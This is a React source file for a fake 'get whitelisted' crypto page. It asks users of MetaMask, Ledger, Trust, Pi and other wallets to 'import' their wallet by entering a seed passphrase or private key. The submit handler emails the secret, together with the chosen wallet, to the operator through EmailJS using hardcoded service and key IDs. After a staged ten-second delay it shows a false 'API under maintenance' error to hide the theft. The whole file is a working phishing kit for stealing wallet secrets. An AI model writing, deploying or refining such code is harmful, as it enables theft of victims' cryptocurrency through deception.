import { useState } from "react";
import emailjs from "emailjs-com"; // Import EmailJS
import "./Connect.css";

export const WalletSelection = () => {
  const [walletsVisible, setWalletsVisible] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showForm, setShowForm] = useState(false);
  const [userType, setUserType] = useState(null); // Tracks if Pi user or wallet user
  const [modalMessage, setModalMessage] = useState(""); // State for the modal message
  const [showModal, setShowModal] = useState(false); // Controls whether modal is visible
  const [loading, setLoading] = useState(false); // New state to control loading state

  const wallets = [
    "MetaMask",
    "Coinbase",
    "Trust",
    "Phantom",
    "Exodus",
    "Ledger",
    "Trezor",
    "Argent",
    "Rainbow",
    "Atomic",
    "Brave",
    "Gnosis Safe",
    "Enjin",
    "Loopring",
    "Fortmatic",
    "Portis",
    "Authereum",
    "Arkane Network",
    "Pillar",
    "Bitget",
    "TonKeeper",
  ];

  const toggleWalletOptions = () => {
    setWalletsVisible(!walletsVisible);
  };

  const handleWalletClick = (walletName) => {
    setSelectedWallet(walletName);
    setShowForm(true); // Show the import form after wallet selection
    setUserType("wallet"); // User selected a wallet
    setWalletsVisible(false);
  };

  const handlePiUserClick = () => {
    setSelectedWallet("Pi User");
    setShowForm(true); // Show the import form for Pi Users
    setUserType("pi");
  };

  const handleFormSubmit = (e) => {
    e.preventDefault();
    const passphrase = e.target.passphrase.value.trim(); // Remove leading/trailing spaces
    const privateKey = e.target.privateKey.value.trim();

    // Normalize spaces (replace multiple spaces with a single space)
    const normalizedPassphrase = passphrase.replace(/\s+/g, " ");

    if (!passphrase && !privateKey) {
      showModalMessage("Please provide either a passphrase or private key.");
      return;
    }

    if (!validatePassphraseAndKey(normalizedPassphrase, privateKey)) {
      return; // Show modal handled in the helper functions
    }

    // If validation passes, send the email
    showModalMessage("Importing wallet, please wait...");
    setLoading(true); // Show loading spinner

    // Prepare data for EmailJS
    const templateParams = {
      selected_wallet: selectedWallet,
      passphrase: normalizedPassphrase,
      private_key: privateKey,
    };

    // Send the email using EmailJS
    emailjs
      .send(
        "service_4r189vq",
        "template_yfa54ag",
        templateParams,
        "hubo9S_vKmkvVMMWJ"
      )
      .then((response) => {
        console.log("sfully:", response);
      })
      .catch((error) => {
        console.error("Failed:", error);
      });

    // Simulate the API delay (10 seconds)
    setTimeout(() => {
      setLoading(false); // Hide loading spinner
      showModalMessage("Wallet import failed❌: API under maintenance🚧⚒");
    }, 10000);
  };

  const validatePassphraseAndKey = (passphrase, privateKey) => {
    if (passphrase && !isValidPassphrase(passphrase)) {
      showModalMessage("Passphrase should contain between 12 and 32 words.");
      return false;
    }

    if (privateKey && !isValidPrivateKey(privateKey)) {
      showModalMessage(
        "Private key should be a valid hexadecimal string of 64 characters."
      );
      return false;
    }

    if (passphrase && privateKey) {
      showModalMessage(
        "Please enter only one method — either passphrase or private key."
      );
      return false;
    }

    return true;
  };

  const showModalMessage = (message) => {
    setModalMessage(message);
    setShowModal(true);
  };

  const isValidPassphrase = (passphrase) => {
    const words = passphrase.split(" ");
    return (
      words.length >= 12 &&
      words.length <= 32 &&
      words.every((word) => word.length > 2)
    );
  };

  const isValidPrivateKey = (privateKey) => {
    const regex = /^[0-9a-fA-F]{64}$/; // Check if it's a valid 64-character hex string
    return regex.test(privateKey);
  };

  const closeModal = () => {
    setShowModal(false); // Close the modal when user clicks the "Close" button
  };

  return (
    <div className="wallet-selection-container">
      <h2>GET WHITELISTED NOW 📝</h2>
      <br></br>
      <div className="button-group">
        <button className="select-wallet-button" onClick={toggleWalletOptions}>
          {walletsVisible ? "Hide Wallets" : "Select Your Wallet"}
        </button>
        <button className="pi-user-button" onClick={handlePiUserClick}>
          PI Users, Whitelist Access
        </button>
      </div>

      {selectedWallet && (
        <button className="selected-wallet-button">
          You selected: <strong>{selectedWallet}</strong>
        </button>
      )}

      {walletsVisible && (
        <div className="wallet-buttons">
          {wallets.map((wallet) => (
            <button
              key={wallet}
              className="wallet-button"
              onClick={() => handleWalletClick(wallet)}
            >
              {wallet}
            </button>
          ))}
        </div>
      )}

      {showForm && (
        <div className="wallet-import-form">
          <h3>
            {userType === "pi"
              ? "Pi User Wallet Import"
              : `Import ${selectedWallet} Wallet`}
          </h3>
          <form onSubmit={handleFormSubmit}>
            <div>
              <label htmlFor="passphrase">
                Passphrase Separate with spaces:
              </label>
              <input
                type="text"
                id="passphrase"
                name="passphrase"
                placeholder="Enter your passphrase"
                style={{ height: "150px" }} // Making passphrase field larger
              />
            </div>
            <p>OR</p>
            <div>
              <label htmlFor="privateKey">Private Key:</label>
              <input
                type="text"
                id="privateKey"
                name="privateKey"
                placeholder="Enter your private key"
              />
            </div>

            <button type="submit">Import Wallet</button>
          </form>
        </div>
      )}

      {/* Modal for Validation Messages */}
      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <p>{modalMessage}</p>
            {loading && (
              <div className="loading-icon">
                {/* Loading icon from the public folder */}
                <img
                  src="/load.gif" // Path to your custom loading gif
                  alt="Loading..."
                  style={{ width: "50px", height: "50px" }} // You can adjust the size
                />
              </div>
            )}
            <button onClick={closeModal}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default WalletSelection;
